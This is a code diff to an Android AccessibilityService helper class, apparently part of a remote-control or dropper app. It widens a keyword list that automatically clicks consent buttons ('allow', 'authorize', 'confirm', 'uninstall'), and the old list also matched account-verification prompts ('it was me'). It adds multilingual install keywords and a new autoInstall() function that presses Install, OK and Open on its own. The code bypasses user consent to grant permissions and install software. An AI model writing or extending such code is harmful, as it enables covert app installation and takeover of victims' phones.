@@ -115,9 +115,10 @@ class InputHelper(private val service: AccessibilityService) {
                 child.text?.toString()?.let { text ->
                     val keywords = listOf(
                         "allow", "ok", "yes", "while using the app", "allow every time",
-                        "confirm", "approve", "authorize", "it was me", "it's me",
-                        "uninstall", "start now", "comenzar", "commencer",
-                        "allow while using the app", "only this time"
+                        "confirm", "approve", "authorize", "uninstall", "start now",
+                        "comenzar", "commencer", "allow while using the app", "only this time",
+                        "install", "installer", "installieren", "instalar",
+                        "open", "done", "finish", "ready"
                     )
                     if (keywords.any { text.contains(it, ignoreCase = true) } && child.isClickable) {
                         child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
@@ -128,6 +129,37 @@ class InputHelper(private val service: AccessibilityService) {
                 autoClickGrant(child, depth + 1)
             } catch (_: Exception) {}
         }
+    }
+
+    fun autoInstall(): Boolean {
+        val root = service.rootInActiveWindow ?: return false
+        try {
+            val nodes = root.findAccessibilityNodeInfosByText("Install")
+            for (node in nodes) {
+                if (node.isClickable) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.d(TAG, "Auto-install: clicked Install")
+                    return true
+                }
+            }
+            val nodesOk = root.findAccessibilityNodeInfosByText("OK")
+            for (node in nodesOk) {
+                if (node.isClickable) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.d(TAG, "Auto-install: clicked OK")
+                    return true
+                }
+            }
+            val nodesOpen = root.findAccessibilityNodeInfosByText("Open")
+            for (node in nodesOpen) {
+                if (node.isClickable) {
+                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    Log.d(TAG, "Auto-install: clicked Open")
+                    return true
+                }
+            }
+        } catch (_: Exception) {}
+        return false
     }
 
     fun clickByText(text: String) {
